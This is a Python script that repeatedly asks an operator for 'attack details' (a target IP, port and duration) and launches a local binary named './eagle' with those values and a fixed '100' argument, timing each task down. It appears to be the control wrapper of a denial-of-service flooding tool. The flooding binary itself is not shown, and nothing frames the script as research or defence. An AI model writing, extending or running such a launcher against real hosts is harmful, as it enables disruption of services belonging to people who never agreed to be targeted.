import subprocess
import time

active_tasks = {}

def process_new_task(ip, port, time_val):
    if ip and port and time_val:
        key = (ip, str(port), str(time_val))
        if key not in active_tasks:
            print(f"[+] New task added: IP={ip}, Port={port}, Time={time_val}")
            try:
                process = subprocess.Popen(['./eagle', ip, str(port), str(time_val), '100'])
                print(f"[+] Launched binary: ./eagle {ip} {port} {time_val} 100 (PID: {process.pid})")

            except Exception as e:
                print(f"[!] Failed to launch binary: {e}")
            active_tasks[key] = int(time_val) 
        else:
            pass
    else:
        print("[!] Task received but missing ip, port, or time values")

def main_loop():
    while True:
        try:
            print("\n📝 Enter attack details:")
            ip = input("IP: ").strip()
            port = input("Port: ").strip()
            time_val = input("Time: ").strip()
            
            if ip and port and time_val:
                process_new_task(ip, port, time_val)
            else:
                print("❌ All fields required!")

            tasks_to_delete = []
            for key in list(active_tasks.keys()):
                active_tasks[key] -= 1
                if active_tasks[key] <= 0:
                    ip, port, orig_time = key
                    print(f"[+] Time expired for task: IP={ip}, Port={port}, Original Time={orig_time}")
                    tasks_to_delete.append(key)

            for key in tasks_to_delete:
                active_tasks.pop(key, None)

            time.sleep(1)
            
        except KeyboardInterrupt:
            print("\n👋 Exiting...")
            break
        except Exception as e:
            print(f"[!] General error: {e}")
            time.sleep(1)

if __name__ == '__main__':
    main_loop()